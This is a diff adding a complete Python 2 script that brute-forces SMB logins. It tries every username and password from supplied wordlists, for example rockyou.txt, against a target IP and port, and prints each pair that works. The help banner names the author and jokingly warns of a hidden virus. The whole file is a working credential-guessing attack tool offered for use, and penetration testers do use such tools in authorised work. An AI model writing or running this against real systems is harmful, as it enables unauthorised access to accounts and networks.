@@ -1,0 +1,89 @@
+#!/usr/bin/env python2
+
+
+import argparse
+import netaddr
+import socket
+import sys
+from smb.SMBConnection import SMBConnection
+
+def run_brute_force(username, password, args):
+	ip = args.ip
+	port = args.port
+	timeout = args.timeout
+	verbose = args.verbose
+
+	client_name = "client"
+	server_name = ip
+	if port == 445:
+		is_direct_tcp = True
+	else:
+		is_direct_tcp = False
+
+	try:
+		conn = SMBConnection(username, password, client_name, server_name, use_ntlm_v2 = True, is_direct_tcp = is_direct_tcp)
+		smb_authentication_successful = conn.connect(ip, port, timeout = timeout)
+		if smb_authentication_successful:
+			print "success: [%s:%s]" % (username, password)
+		else:
+			if verbose:
+				print "failed: [%s:%s]" % (username, password)
+	except:
+		if verbose:
+			e = sys.exc_info()
+			print "%s" % str(e)
+	finally:
+		if conn:
+			conn.close()
+
+
+def parse_passwords(username, args):
+	if args.password != None:
+		run_brute_force(username, args.password, args)
+	elif args.passwordfile:
+		passwordfile = open(args.passwordfile, "r")
+		for password in passwordfile:
+			password = password.strip()
+			run_brute_force(username, password, args)
+		passwordfile.close()
+
+
+def parse_usernames(args):
+	if args.username != None:
+		parse_passwords(args.username, args)
+	elif args.userfile:
+		userfile = open(args.userfile, "r")
+		for username in userfile:
+			username = username.strip()
+			parse_passwords(username, args)
+		userfile.close()
+
+
+def main():
+	parser_description =	"Brute forcing SMB\n" +\
+				"Enjoy\n" +\
+				"There Might Be A Hidden Virus!!! Run At Own Risk\n" +\
+				" _____ _   _ ____     ____    _    __  __ _____ _ \n" +\
+				"| ____| \ | |  _ \   / ___|  / \  |  \/  | ____| |\n" +\
+				"|  _| |  \| | | | | | |  _  / _ \ | |\/| |  _| | |\n" +\
+				"| |___| |\  | |_| | | |_| |/ ___ \| |  | | |___|_|\n"+\
+				"|_____|_| \_|____/   \____/_/   \_\_|  |_|_____(_)\n"+\
+				"				Damien Nair\n        "
+	parser = argparse.ArgumentParser(description = parser_description, formatter_class=argparse.RawTextHelpFormatter)
+	parser.add_argument("-ip", action="store", dest="ip", required=True, help="e.g. 192.168.0.1")
+	parser.add_argument("-port", action="store", dest="port", required=True, type=int, help="e.g. 145,139")
+	group1 = parser.add_mutually_exclusive_group(required=True)
+	group1.add_argument("-username", action="store", dest="username", help="e.g. administrator")
+	group1.add_argument("-userfile", action="store", dest="userfile", help="e.g. users.txt")
+	group2 = parser.add_mutually_exclusive_group(required=True)
+	group2.add_argument("-password", action="store", dest="password", help="e.g. password2019")
+	group2.add_argument("-passwordfile", action="store", dest="passwordfile", help="e.g. usr/share/wordlists/rockyou.txt")
+	parser.add_argument("-timeout", action="store", dest="timeout", type=int, default=5, required=False, help="default 5")
+	parser.add_argument("-v", action="store_true", dest="verbose", help="Verbose/show more output", default=False, required=False)
+	args = parser.parse_args()
+
+	parse_usernames(args)
+
+
+if __name__ == '__main__':
+	main()
